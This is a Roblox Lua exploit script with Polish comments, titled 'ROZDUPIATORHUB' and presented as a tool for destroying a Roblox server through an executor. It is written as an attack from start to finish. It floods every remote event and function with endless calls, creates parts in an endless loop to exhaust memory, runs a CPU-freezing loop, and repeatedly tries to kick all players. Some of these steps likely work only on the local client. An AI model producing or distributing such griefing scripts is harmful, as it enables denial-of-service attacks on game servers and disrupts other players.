--[[
    ROZDUPIATORHUB – skrypt do niszczenia serwera Roblox przez Xeno
    Użycie: uruchom w executorze.
]]

-- Funkcja spamująca zdarzeniami zdalnymi
local function spamZdalne()
    local repStorage = game:GetService("ReplicatedStorage")
    for _, obiekt in ipairs(repStorage:GetChildren()) do
        if obiekt:IsA("RemoteEvent") or obiekt:IsA("RemoteFunction") then
            spawn(function()
                while true do
                    pcall(function()
                        obiekt:FireServer("CRASH_DATA")
                    end)
                end
            end)
        end
    end
end

-- Funkcja przeciążająca pamięć (tworzenie tysięcy obiektów)
local function wyciekPamieci()
    local czesci = {}
    while true do
        local czesc = Instance.new("Part")
        czesc.Name = "WYCIEK_" .. tostring(#czesci)
        czesc.Parent = workspace
        table.insert(czesci, czesc)
    end
end

-- Funkcja zamrażająca wątki (nieskończona pętla)
local function zapetlenie()
    local x = 0
    while true do
        x = x + 1
        if x > 1e9 then x = 0 end
    end
end

-- Uruchomienie ataków
spawn(spamZdalne)
spawn(wyciekPamieci)
spawn(zapetlenie)

-- Blokowanie graczy (wyrzucanie)
task.wait(0.5)
spawn(function()
    while true do
        for _, gracz in ipairs(game.Players:GetPlayers()) do
            pcall(function()
                gracz:Kick("Serwer zniszczony przez ROZDUPIATORHUB")
            end)
        end
        task.wait(0.1)
    end
end)
